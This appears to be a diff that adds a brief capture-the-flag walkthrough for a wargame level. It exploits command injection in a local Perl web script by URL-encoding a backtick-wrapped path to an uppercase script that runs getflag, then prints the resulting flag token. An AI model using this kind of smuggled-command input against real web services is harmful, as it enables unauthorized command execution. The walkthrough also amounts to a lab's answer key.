@@ -1,0 +1,30 @@
+                                                        
+██╗     ███████╗██╗   ██╗███████╗██╗          ██╗██████╗ 
+██║     ██╔════╝██║   ██║██╔════╝██║         ███║╚════██╗
+██║     █████╗  ██║   ██║█████╗  ██║         ╚██║ █████╔╝
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║          ██║██╔═══╝ 
+███████╗███████╗ ╚████╔╝ ███████╗███████╗     ██║███████╗
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝     ╚═╝╚══════╝
+      
+	                                                     
+strings level12.pl
+-> # localhost:4646
+
+Create a SCRIPT file at /tmp which run the getflag command.
+(The filename must be in uppercase)
+
+Don't forget to give the execution rights:
+chmod +x SCRIPT
+
+Go to : http://meyerweb.com/eric/tools/dencoder/ and encode the folowing string:
+`/*/script`
+
+We get:
+->%60%2F*%2Fscript%60
+
+curl "localhost:4646?x=%60%2F*%2Fscript%60"
+
+cat /tmp/password
+                                |═══════════════════════════|
+Check flag.Here is your token : | g1qKMiRpXf53AWhDaU7FEkczr |
+                                |═══════════════════════════|
